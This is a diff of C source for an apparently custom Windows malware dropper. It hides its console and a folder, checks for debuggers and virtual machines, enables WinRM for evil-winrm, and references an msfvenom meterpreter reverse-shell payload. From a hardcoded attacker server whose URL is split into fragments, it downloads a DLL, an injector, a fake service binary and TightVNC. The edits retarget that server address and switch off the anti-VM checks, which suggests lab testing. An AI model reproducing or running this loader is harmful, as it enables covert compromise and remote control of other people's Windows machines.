@@ -9,9 +9,9 @@
 #include <wchar.h> 
 #include <wininet.h>
 
-//Add dead code
-//maybe try making the web server only requestable by CURL user agent (refer to nginx config)
-//Enable WinRM for monitoring with evil-winrm
+//Add dead code	-> DONE
+//maybe try making the web server only requestable by CURL user agent (refer to nginx config)	-> NOT YET (I'm using python3 http.server)
+//Enable WinRM for monitoring with evil-winrm	-> DONE
 
 //mt.exe -manifest app.manifest -outputresource:.\stage_zero.exe
 
@@ -19,7 +19,7 @@
 NTSTATUS STATUS;
 unsigned char magic[160000];
 
-/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f csharp exitfunc=thread*/
+/* msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.13 LPORT=123 -f raw exitfunc=thread*/
 
 
 
@@ -188,7 +188,7 @@ int w1n_Rm(){
 BOOL dw_ff1e1(const char *url, const char *output_path,FARPROC n3t_op3n_func,FARPROC n3t_op3n_ur1_func,FARPROC n3t_r3ad_f1l3_func,FARPROC n3t_cl0s3_hndl3_func) {
     HINTERNET hInternet = n3t_op3n_func("af21_ff1e1", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hInternet) return FALSE;
-
+	printf("url is %s\n",url);
     HINTERNET hUrl = n3t_op3n_ur1_func(hInternet, url, NULL, 0, INTERNET_FLAG_RELOAD, 0);
     if (!hUrl) {
         n3t_cl0s3_hndl3_func(hInternet);
@@ -2294,10 +2294,10 @@ int main(){
 	
 
     //Get the console window handle
-    HWND consoleWindow = GetConsoleWindow();
+    //HWND consoleWindow = GetConsoleWindow();
     
     //Hide the window
-    ShowWindow(consoleWindow, SW_HIDE);	
+    //ShowWindow(consoleWindow, SW_HIDE);	
 	
 	Chk_DBG();
 	
@@ -2817,7 +2817,7 @@ int main(){
 	strcat(full_string_key_6, part_string_key_6_17);
 	strcat(full_string_key_6, part_string_key_6_18);
 
-	
+	/*
 	if (Chk_VM_cmp(HKEY_LOCAL_MACHINE, full_string_key_1,
 	full_string_key_2, full_string_key_4,open_key_reg_func,query_key_reg_func)) {
 	//printf("VirtualBox VM registry key value detected :(\n");
@@ -2977,7 +2977,7 @@ int main(){
 	
 	Chk_VM(NT_DelayExecution);
 	// --- END ANTI-VM --- //
-	
+	*/
 	
 	// --- START CREATE MUTEX --- //
 	HANDLE hMux = NULL;
@@ -3037,7 +3037,7 @@ int main(){
 	
 	//printf("%s\n",full_string_1);
 	
-	char full_string_n3t[100];  //http://192.168.8.161:8000
+	char full_string_n3t[100];  //http://192.168.100.13:8000
 	char part_n3t_1[] = "h";
 	char part_n3t_2[] = "t";
 	char part_n3t_3[] = "tp";
@@ -3049,10 +3049,10 @@ int main(){
 	char part_n3t_9[] = ".1";
 	char part_n3t_10[] = "6";
 	char part_n3t_11[] = "8.";
-	char part_n3t_12[] = "8";
-	char part_n3t_13[] = ".1";
-	char part_n3t_14[] = "6";
-	char part_n3t_15[] = "1:";
+	char part_n3t_12[] = "1";
+	char part_n3t_13[] = "0";
+	char part_n3t_14[] = "0.1";
+	char part_n3t_15[] = "3:";
 	char part_n3t_16[] = "8";
 	char part_n3t_17[] = "000";
 	char part_n3t_18[] = "/";
@@ -3090,10 +3090,10 @@ int main(){
 		}
 
 	}
-	//printf("[+] Created Directory\n");
+	printf("[+] Created Directory\n");
 	
 	
-	//printf("[+] Hiding the folder\n");
+	printf("[+] Hiding the folder\n");
 	//FILE_ATTRIBUTE_DIRECTORY -> 0x10
 	//FILE_ATTRIBUTE_HIDDEN -> 0x2
 	if (set_file_attr_func(full_string_1, 0x10 | 0x2)) {
@@ -3161,7 +3161,7 @@ int main(){
 	//printf("%s\n",full_string_7);
 	//wprintf(L"%s\n",file_path_1);
 
-	char full_string_n3t_1[110]; //http://192.168.8.161:8000/legit.dll
+	char full_string_n3t_1[110]; //http://192.168.100.13:8000/legit.dll
 	strcpy(full_string_n3t_1,full_string_n3t);
 	strcat(full_string_n3t_1,full_string_5);
 
@@ -3225,7 +3225,7 @@ int main(){
 	//printf("%s\n",full_string_10);
 	
 
-	char full_string_n3t_2[110]; //http://192.168.8.161:8000/win_service32.exe
+	char full_string_n3t_2[110]; ////http://192.168.100.13:8000/win_service32.exe
 	strcpy(full_string_n3t_2,full_string_n3t);
 	strcat(full_string_n3t_2,full_string_8);
 	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_2);
@@ -3290,7 +3290,7 @@ int main(){
 	
 	
 	
-	char full_string_n3t_3[110]; //http://192.168.8.161:8000/dll_injector.exe
+	char full_string_n3t_3[110]; //http://192.168.100.13:8000/dll_injector.exe
 	strcpy(full_string_n3t_3,full_string_n3t);
 	strcat(full_string_n3t_3,full_string_11);
 	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_3);
@@ -3387,7 +3387,7 @@ int main(){
 	
 	
 	
-	char full_string_n3t_4[110]; //http://192.168.8.161:8000/tightVNC.msi
+	char full_string_n3t_4[110]; //http://192.168.100.13:8000/tightVNC.msi
 	strcpy(full_string_n3t_4,full_string_n3t);
 	strcat(full_string_n3t_4,full_string_14);
 	//printf("[+] Going into the download function with that arg -> %s\n",full_string_n3t_4);
